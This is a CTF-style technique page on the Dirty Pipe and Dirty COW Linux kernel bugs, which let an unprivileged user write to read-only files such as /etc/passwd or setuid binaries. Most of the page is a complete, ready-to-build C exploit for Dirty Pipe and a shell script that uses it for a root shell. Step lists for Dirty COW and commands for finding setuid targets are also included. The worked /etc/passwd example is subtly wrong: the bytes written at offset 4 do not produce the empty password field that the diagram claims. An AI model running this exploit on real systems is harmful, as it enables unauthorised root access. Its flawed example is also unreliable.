---
title: "Dirty Pipe and Dirty COW - Page-Cache Write Primitives in CTF"
category: pwn
subcategory: kernel
type: technique
tags: [kernel, dirty-pipe, dirty-cow, cve-2022-0847, cve-2016-5195, pipe-buffer, page-cache, copy-on-write, splice, madvise, read-only-file, privilege-escalation, qemu, gdb, pwndbg]
difficulty: medium
summary: "Two bugs that let an unprivileged user write to files they can only read - overwrite /etc/passwd or a setuid binary and become root without touching kernel control flow."
when_to_use:
  - "The challenge kernel is 5.8 - 5.16.11 (Dirty Pipe) or < 4.8.3 (Dirty COW)"
  - "You have a read-only file whose contents decide privileges (/etc/passwd, a setuid ELF)"
  - "You found a bug that gives you control of a `pipe_buffer` flags field"
  - "You want a data-only escalation that ignores SMEP/SMAP/KPTI/kCFI"
tools: [qemu, gcc, gdb, pwndbg]
related: [kernel-slub-uaf-objects, kernel-modprobe-path, kernel-mitigations, kernel-race-widening, kernel-setup-and-debug]
cves: [CVE-2022-0847, CVE-2016-5195]
---

## TL;DR

Both bugs end in the same place: **you write into the page cache of a file you only
have read access to**. Dirty Pipe (CVE-2022-0847) does it by leaving
`PIPE_BUF_FLAG_CAN_MERGE` set on a pipe buffer that points at a page-cache page, so a
subsequent `write()` lands in that page. Dirty COW (CVE-2016-5195) races
`madvise(MADV_DONTNEED)` against a COW fault so the write hits the shared page instead
of the private copy. Overwrite `/etc/passwd` or a setuid binary and you are root.

## Recognise it

- `uname -r` in the challenge VM reports 5.8 - 5.16.11 (Dirty Pipe) or <= 4.8.2
  (Dirty COW).
- There is a setuid binary or a writable-by-root-only config that decides privileges.
- The challenge gives you no driver at all - the kernel *is* the bug.
- A custom driver lets you set flags on a `pipe_buffer` - the same primitive, reachable
  through a different bug.

## Vulnerable code shape

Dirty Pipe, `fs/splice.c` / `lib/iov_iter.c` before the fix:

```c
static int copy_page_to_iter_pipe(struct page *page, size_t offset,
                                  size_t bytes, struct iov_iter *i)
{
    struct pipe_inode_info *pipe = i->pipe;
    struct pipe_buffer *buf;
    ...
    buf = &pipe->bufs[i_head & p_mask];
    buf->ops = &page_cache_pipe_buf_ops;
    get_page(page);
    buf->page = page;
    buf->offset = offset;
    buf->len = bytes;
    /* BUG: buf->flags is never initialised, so a stale
       PIPE_BUF_FLAG_CAN_MERGE from a previous anonymous pipe buffer survives */
    ...
}
```

and the consumer, `fs/pipe.c`:

```c
if (buf->ops == &anon_pipe_buf_ops /* pre-fix: only the flag was checked */
    && (buf->flags & PIPE_BUF_FLAG_CAN_MERGE)) {
    ...
    ret = copy_page_from_iter(buf->page, offset, chars, from);   /* writes the page */
}
```

Dirty COW, `mm/gup.c` `__get_user_pages` retry loop: a `FOLL_WRITE` fault on a
private mapping can, after `MADV_DONTNEED` drops the COW copy, end up writing the
original read-only page-cache page.

## Theory

Targets: Dirty Pipe = Linux 5.8 up to 5.16.10 / 5.15.24 / 5.10.101. Dirty COW =
everything before 4.8.3 / 4.4.26.

### Dirty Pipe mechanics

1. A pipe buffer's `flags` field is reused without being cleared.
   `PIPE_BUF_FLAG_CAN_MERGE` means "a following `write()` may append into this
   buffer's page instead of allocating a new one".
2. `splice(file_fd, &off, pipe_fd, NULL, n, 0)` makes a pipe buffer point directly at
   a **page-cache page** of `file_fd` (no copy - that is the point of splice).
3. If the stale `CAN_MERGE` flag is still set on that buffer, the next
   `write(pipe_fd, data, len)` merges into the page-cache page.
4. The page is now dirty in the page cache, so every reader of the file sees your
   bytes - including `execve` of a setuid binary.

Setting the stale flag: fill the pipe completely with `write()` (all buffers become
anonymous with `CAN_MERGE`), then drain it with `read()`. The buffers are recycled but
`flags` keeps the bit.

Two hard constraints:

- **You cannot write at offset 0 of a page.** The merge appends *after*
  `buf->offset + buf->len`, and a splice of `n` bytes starting at file offset `off`
  leaves `offset = off % PAGE_SIZE`. So the target offset must not be page aligned:
  splice one byte at `target_offset - 1` first.
- **You cannot extend the file.** Only existing bytes within the last page are
  rewritable.

### Dirty COW mechanics

Two threads:

- Thread A: `madvise(map, len, MADV_DONTNEED)` in a tight loop - discards the private
  COW copy.
- Thread B: `pwrite(/proc/self/mem, data, len, (off_t)map)` in a tight loop - forces a
  `FOLL_WRITE | FOLL_FORCE` GUP fault.

If `MADV_DONTNEED` lands between the COW break and the actual write, the write goes to
the original page-cache page. `MAP_PRIVATE` of a read-only file is enough.

The fix added `FOLL_COW` so the retry cannot lose the "this was a COW fault" state.

### What to overwrite

| target | why | how you become root |
|--------|-----|---------------------|
| `/etc/passwd` | it is world readable, hence in the page cache, and `root:x:` can become `root::` | `su root` with no password |
| a setuid binary (`/bin/su`, `/usr/bin/passwd`) | runs as root | patch it into a shellcode stub, or into `#!/bin/sh`-style behaviour via an ELF patch |
| `/etc/shadow` | if readable (unusual) | replace the hash |
| a root cron/init script | runs as root later | append a command |
| a shared library used by a setuid binary | page cache is shared | inject a constructor |

In a CTF initramfs there is often no `su`; the reliable move is to overwrite
`/etc/passwd`'s root line so the password is empty **and** check whether the image has
`/bin/login` or `su`. If not, patch a setuid helper, or simply read the flag if the
challenge only wants file content.

## Attack

Dirty Pipe against `/etc/passwd`:

1. `stat("/etc/passwd")` and read it to find the byte offset of `root:x:0:0`.
2. Choose `offset = position_of_the_x_field`; ensure `offset % PAGE_SIZE != 0`
   (if it is, target the byte before and include it in your data).
3. `pipe(p)`.
4. Fill the pipe: write `PIPE_SIZE` bytes (default 64 KB = 16 buffers of 4 KB).
5. Drain the pipe: read it all back. All 16 buffers now carry a stale `CAN_MERGE`.
6. `fd = open("/etc/passwd", O_RDONLY)`.
7. `splice(fd, &(loff_t){offset - 1}, p[1], NULL, 1, 0)` - one byte, so the pipe buffer
   points at the page-cache page with `offset = (offset-1) % PAGE_SIZE`, `len = 1`.
8. `write(p[1], "::0:0:root:/root:/bin/sh\n", len)` - merges into the page.
9. `su root` (no password), or just re-read the file to confirm.

Dirty COW against a setuid binary:

1. `fd = open("/usr/bin/passwd", O_RDONLY)`.
2. `map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0)`.
3. Start the `madvise` thread and the `/proc/self/mem` write thread.
4. After ~1e5 iterations the file is patched.
5. Run the binary.

## Heap state

```text
Dirty Pipe

 step 4-5: fill then drain

   pipe->bufs[0..15]
     each: { page = anon page, ops = anon_pipe_buf_ops,
             flags = PIPE_BUF_FLAG_CAN_MERGE }     <- set by pipe_write
   after read(): head/tail move, but bufs[] keep flags


 step 7: splice(file -> pipe, 1 byte at offset-1)

   pipe->bufs[k]
     page   -> PAGE CACHE page of /etc/passwd     <-- not a copy!
     ops    -> page_cache_pipe_buf_ops
     offset -> (offset-1) & 0xfff
     len    -> 1
     flags  -> PIPE_BUF_FLAG_CAN_MERGE            <-- STALE, should be 0


 step 8: write(pipe, data, n)

   pipe_write() sees CAN_MERGE and appends into buf->page at
   buf->offset + buf->len  ==  (offset-1)+1  ==  offset

   copy_page_from_iter(buf->page, offset & 0xfff, n, from)
      -> writes n bytes straight into the page cache of /etc/passwd

   /etc/passwd  before: root:x:0:0:root:/root:/bin/sh
                after : root::0:0:root:/root:/bin/sh
                            ^ password field now empty


Dirty COW

   thread B: pwrite(/proc/self/mem, buf, n, map)
                get_user_pages(FOLL_WRITE|FOLL_FORCE)
                  -> COW break: allocate a private copy
   thread A: madvise(map, n, MADV_DONTNEED)
                  -> drop the private copy
   thread B retry: finds the ORIGINAL page-cache page still mapped
                  -> writes to it
```

## Exploit

```c
/* dirtypipe.c - CVE-2022-0847.
 * Build: gcc -static -O2 -o exp dirtypipe.c
 * Usage: ./exp <file> <offset> <data>
 *        ./exp /etc/passwd 4 ':0:0:root:/root:/bin/sh'
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <unistd.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void die(const char *m)
{
    perror(m);
    exit(1);
}

/* Fill every pipe buffer, then drain, leaving PIPE_BUF_FLAG_CAN_MERGE set. */
static void prepare_pipe(int p[2])
{
    unsigned pipe_size, r;
    static char buffer[4096];

    if (pipe(p))
        die("pipe");

    pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    if ((int)pipe_size < 0)
        die("F_GETPIPE_SZ");

    /* Fill: every buffer becomes anonymous with CAN_MERGE set. */
    for (r = pipe_size; r > 0;) {
        unsigned n = r > sizeof buffer ? sizeof buffer : r;
        if (write(p[1], buffer, n) != (ssize_t)n)
            die("write(fill)");
        r -= n;
    }

    /* Drain: the buffers are released but flags survive. */
    for (r = pipe_size; r > 0;) {
        unsigned n = r > sizeof buffer ? sizeof buffer : r;
        if (read(p[0], buffer, n) != (ssize_t)n)
            die("read(drain)");
        r -= n;
    }
}

int main(int argc, char **argv)
{
    const char *path;
    loff_t offset, next_page, end_page;
    const char *data;
    size_t data_len;
    int fd, p[2];
    ssize_t nbytes;

    if (argc != 4) {
        fprintf(stderr,
                "usage: %s <file> <offset> <data>\n"
                "  e.g. %s /etc/passwd 4 ':0:0:root:/root:/bin/sh'\n",
                argv[0], argv[0]);
        return 2;
    }

    path = argv[1];
    offset = strtoull(argv[2], NULL, 0);
    data = argv[3];
    data_len = strlen(data);

    next_page = (offset | (PAGE_SIZE - 1)) + 1;
    end_page = (offset + data_len - 1) | (PAGE_SIZE - 1);

    if (offset % PAGE_SIZE == 0) {
        fprintf(stderr, "[-] offset must not be page aligned "
                        "(shift it by one and include the original byte)\n");
        return 1;
    }
    if (end_page != next_page - 1) {
        fprintf(stderr, "[-] the write must stay inside one page "
                        "(%zu bytes from %#llx crosses a boundary)\n",
                data_len, (unsigned long long)offset);
        return 1;
    }

    fd = open(path, O_RDONLY);
    if (fd < 0)
        die("open target");

    prepare_pipe(p);
    printf("[+] pipe primed, all buffers carry a stale CAN_MERGE\n");

    /* Splice ONE byte at offset-1: the pipe buffer now points at the
     * page-cache page, with buf->offset+buf->len == offset. */
    --offset;
    nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0)
        die("splice");
    if (nbytes == 0) {
        fprintf(stderr, "[-] short splice: offset past EOF?\n");
        return 1;
    }
    printf("[+] spliced 1 byte of page-cache into the pipe\n");

    /* The merge writes straight into the page cache. */
    nbytes = write(p[1], data, data_len);
    if (nbytes < 0)
        die("write(merge)");
    if ((size_t)nbytes < data_len) {
        fprintf(stderr, "[-] short write (%zd of %zu)\n", nbytes, data_len);
        return 1;
    }

    printf("[+] wrote %zu bytes into the page cache of %s\n", data_len, path);
    printf("[*] verify with: head -1 %s\n", path);
    close(fd);
    close(p[0]);
    close(p[1]);
    return 0;
}
```

```bash
#!/bin/sh
# passwd_root.sh - turn the Dirty Pipe write into a root shell.

# 1. what does the root line look like, and where is the password field?
head -1 /etc/passwd
# root:x:0:0:root:/root:/bin/sh
#      ^ offset 5 is the 'x'; offset 4 is the ':' before it

# 2. overwrite starting at offset 4 with an empty password field.
#    (offset 4 is not page aligned, so the primitive applies)
./exp /etc/passwd 4 ':0:0:root:/root:/bin/sh'

# 3. confirm and escalate
head -1 /etc/passwd
su root            # no password prompt, or an empty one

# If there is no `su` in the initramfs, patch a setuid binary instead:
ls -l /bin /usr/bin | grep '^-rws'
```

## Variants & pitfalls

- **Page alignment.** The primitive cannot write the first byte of a page. Shift the
  start back by one and re-write the original byte as part of your data.
- **Single page only.** The merge is bounded by the page; split a long write into one
  splice+write per page.
- **The file must be on a page-cache-backed filesystem.** tmpfs (which the initramfs
  is) works; some special filesystems do not.
- **The change is in the page cache, not on disk.** That is enough for `su` and
  `execve`, and it survives until the page is evicted. In a CTF VM there is no disk
  anyway.
- **No `su` in the initramfs.** Very common. Then target a setuid binary, or use the
  primitive to write `/etc/passwd` *and* check for `/bin/login`, or forget privilege
  escalation and check whether the flag file itself is merely unreadable
  (Dirty Pipe cannot read, only write).
- **Dirty COW is a race** - it needs both threads spinning and can take seconds.
  It also has a well-known variant that corrupts the target on failure.
- **Dirty COW is patched everywhere** since 2016; you will only see it in a
  deliberately old challenge kernel.
- **A custom driver that lets you set `pipe_buffer.flags`** is Dirty Pipe by another
  route: the same `CAN_MERGE`-on-a-page-cache-page condition, reachable from a
  heap UAF. Look for it whenever your UAF is in `kmalloc-1024`.

## Debugging

```text
pwndbg> b pipe_write
pwndbg> p *(struct pipe_buffer *)$rdi
pwndbg> p pipe->bufs[0].flags
pwndbg> p/x PIPE_BUF_FLAG_CAN_MERGE
pwndbg> b copy_page_from_iter
pwndbg> b splice_to_pipe
pwndbg> b copy_page_to_iter_pipe
pwndbg> p page_address(buf->page)
```

```bash
# Version check first - this decides whether the bug exists at all.
uname -r
cat /proc/version
# Confirm the write landed (page cache, so a plain read shows it):
head -1 /etc/passwd | xxd | head -2
# Find setuid binaries worth patching:
find / -perm -4000 -type f 2>/dev/null
```

## Tools

- `gcc -static`.
- `xxd`/`hexdump` to locate the exact byte offset to overwrite.
- `gdb` + `pwndbg` if you are reaching the same primitive through a driver bug.

## References

- CVE-2022-0847 (Dirty Pipe), fixed by "lib/iov_iter: initialize `flags` in new
  pipe_buffer" in Linux 5.16.11 / 5.15.25 / 5.10.102.
- CVE-2016-5195 (Dirty COW), fixed by "mm: remove gup_flags FOLL_WRITE games from
  `__get_user_pages()`".
- Linux `fs/pipe.c`, `fs/splice.c`, `lib/iov_iter.c`, `mm/gup.c`.
